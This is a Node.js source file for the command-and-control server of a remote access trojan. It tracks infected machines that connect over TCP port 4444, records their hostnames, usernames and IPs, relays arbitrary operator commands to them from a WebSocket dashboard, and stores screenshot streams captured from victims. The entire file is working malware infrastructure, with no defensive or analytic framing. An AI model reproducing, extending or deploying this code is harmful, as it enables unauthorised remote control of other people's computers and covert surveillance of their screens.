const WebSocket = require('ws');
const net = require('net');
const { v4: uuidv4 } = require('uuid');
const C2Database = require('./bridge/database');

// Configuration
const WS_PORT = 8080;      // WebSocket server port (React dashboard)
const TCP_PORT = 4444;     // TCP server port (C++ RAT clients)

// Initialize database
const db = new C2Database('c2_data.db');

// Store connected clients
const ratClients = new Map();      // TCP RAT clients: id -> { socket, info, lastSeen }
const dashboardClients = new Map(); // WebSocket dashboard clients: ws -> { lastPing, clientId }

// Create WebSocket server for React dashboard
const wss = new WebSocket.Server({ 
    port: WS_PORT,
    clientTracking: true,
    perMessageDeflate: false,
    maxPayload: 1048576 // 1MB
});

console.log(`WebSocket server listening on port ${WS_PORT}`);

// Create TCP server for C++ RAT clients
const tcpServer = net.createServer({
    keepAlive: true,
    keepAliveInitialDelay: 30000,
    pauseOnConnect: false
});

console.log(`TCP server listening on port ${TCP_PORT}`);

// Format timestamp to readable date
function formatTimestamp(timestamp) {
    if (!timestamp) return 'Never';
    const date = new Date(timestamp);
    return date.toLocaleString();
}

const NORMAL_DASHBOARD_CLOSE_CODES = new Set([1000, 1001, 1005]);

function formatCloseReason(reason) {
    if (!reason) return '';
    if (Buffer.isBuffer(reason)) {
        return reason.toString('utf8');
    }
    return reason;
}

// Send command to RAT client
function sendCommandToClient(clientId, command) {
    const ratClient = ratClients.get(clientId);
    if (ratClient && ratClient.socket && !ratClient.socket.destroyed) {
        console.log(`Sending command to client ${clientId}: ${command}`);
        ratClient.socket.write(command + '\n');
        return true;
    } else {
        console.log(`Client ${clientId} not connected`);
        return false;
    }
}

// WebSocket server for dashboard
wss.on('connection', (ws, req) => {
    const dashboardClientId = uuidv4();
    console.log(`Dashboard client connected: ${dashboardClientId}`);
    
    dashboardClients.set(ws, {
        lastPing: Date.now(),
        clientId: dashboardClientId
    });
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            
            switch (data.type) {
                case 'ping':
                    ws.send(JSON.stringify({
                        type: 'pong',
                        timestamp: Date.now()
                    }));
                    break;
                    
                case 'get_clients':
                    const clientList = Array.from(ratClients.entries()).map(([id, client]) => ({
                        id,
                        hostname: client.info?.hostname || 'Unknown',
                        username: client.info?.username || 'Unknown',
                        ip: client.socket?.remoteAddress || 'Unknown',
                        lastSeen: client.lastSeen,
                        connectedAt: client.connectedAt
                    }));
                    
                    ws.send(JSON.stringify({
                        type: 'db_response',
                        query: 'get_clients',
                        data: clientList,
                        timestamp: Date.now()
                    }));
                    break;
                    
                case 'send_command':
                    if (data.clientId && data.command) {
                        const success = sendCommandToClient(data.clientId, data.command);
                        ws.send(JSON.stringify({
                            type: 'command_result',
                            clientId: data.clientId,
                            command: data.command,
                            success,
                            timestamp: Date.now()
                        }));
                    }
                    break;
            }
        } catch (err) {
            console.error('Error processing WebSocket message:', err.message);
        }
    });
    
    ws.on('close', (code, reason) => {
        const reasonStr = formatCloseReason(reason);
        const reasonSuffix = reasonStr ? `, reason: ${reasonStr}` : '';
        
        if (NORMAL_DASHBOARD_CLOSE_CODES.has(code)) {
            console.log(`Dashboard client closed: ${dashboardClientId} (code: ${code}${reasonSuffix})`);
        } else {
            console.log(`Dashboard client closed abnormally: ${dashboardClientId} (code: ${code}${reasonSuffix})`);
        }
        
        dashboardClients.delete(ws);
    });
    
    ws.on('error', (err) => {
        console.error(`Dashboard client error (${dashboardClientId}):`, err.message);
    });
});

// TCP server for RAT clients
tcpServer.on('connection', (socket) => {
    const clientId = uuidv4();
    console.log(`RAT client connected: ${clientId} (${socket.remoteAddress}:${socket.remotePort})`);
    
    const clientInfo = {
        socket,
        info: {},
        lastSeen: Date.now(),
        connectedAt: Date.now()
    };
    
    ratClients.set(clientId, clientInfo);
    
    socket.on('data', (data) => {
        clientInfo.lastSeen = Date.now();
        const message = data.toString().trim();
        console.log(`Received from ${clientId}: ${message}`);
        
        // Handle client identification
        if (message.startsWith('CLIENT_ID|')) {
            const parts = message.split('|');
            if (parts.length >= 3) {
                clientInfo.info = {
                    hostname: parts[1],
                    username: parts[2]
                };
                
                console.log(`Client ${clientId} identified: ${parts[1]}\\${parts[2]}`);
                
                try {
                    db.addOrUpdateClient(clientId, parts[1], parts[2], socket.remoteAddress);
                    console.log(`Client ${clientId} saved to database`);
                } catch (dbError) {
                    console.error(`Database error for client ${clientId}:`, dbError.message);
                }
            }
        } else if (message.startsWith('SCREENSHOT_STREAM|')) {
            // Handle screenshot stream data
            const parts = message.split('|');
            if (parts.length >= 3) {
                const size = parseInt(parts[1], 10);
                const imageData = parts.slice(2).join('|');
                
                try {
                    // Store screenshot in database
                    db.addScreenshot(clientId, imageData, null, null, true);
                    console.log(`Stream screenshot saved for client ${clientId}, size: ${size} bytes`);
                    
                    // Notify dashboard clients
                    dashboardClients.forEach((data, ws) => {
                        if (ws.readyState === WebSocket.OPEN) {
                            try {
                                ws.send(JSON.stringify({
                                    type: 'screenshot_stream',
                                    clientId,
                                    timestamp: Date.now()
                                }));
                            } catch (error) {
                                console.error('Error sending screenshot_stream:', error.message);
                            }
                        }
                    });
                } catch (dbError) {
                    console.error(`Database error for screenshot ${clientId}:`, dbError.message);
                }
            }
        }
    });
    
    socket.on('timeout', () => {
        console.log(`RAT client ${clientId} socket timeout (ignored)`);
        // Reset timeout to keep connection open
        socket.setTimeout(0);
    });
    
    socket.on('error', (err) => {
        console.error(`RAT client error (${clientId}):`, err.message);
    });
    
    socket.on('close', () => {
        console.log(`RAT client disconnected: ${clientId}`);
        ratClients.delete(clientId);
    });
    
    // Set initial timeout
    socket.setTimeout(300000); // 5 minutes
});

tcpServer.listen(TCP_PORT, () => {
    console.log(`TCP server started on port ${TCP_PORT}`);
});

// Clean up stale dashboard connections every minute
setInterval(() => {
    const now = Date.now();
    dashboardClients.forEach((data, ws) => {
        if (now - data.lastPing > 300000) { // 5 minutes
            console.log(`Cleaning up stale dashboard client: ${data.clientId}`);
            try {
                ws.close(1001, 'Connection timeout');
            } catch (err) {
                // Ignore
            }
            dashboardClients.delete(ws);
        }
    });
}, 60000);

// Handle server shutdown
process.on('SIGINT', () => {
    console.log('\nShutting down servers...');
    
    // Close all RAT connections
    ratClients.forEach(client => {
        if (client.socket && !client.socket.destroyed) {
            client.socket.destroy();
        }
    });
    
    // Close all dashboard connections
    dashboardClients.forEach((data, ws) => {
        ws.close();
    });
    
    // Close servers
    wss.close();
    tcpServer.close();
    
    console.log('Servers closed');
    process.exit(0);
});

console.log('C2 Bridge Server started (Test Mode)');
console.log(`- WebSocket (Dashboard): ws://localhost:${WS_PORT}`);
console.log(`- TCP (RAT Clients): localhost:${TCP_PORT}`);
console.log('\nServer running. Press Ctrl+C to stop.');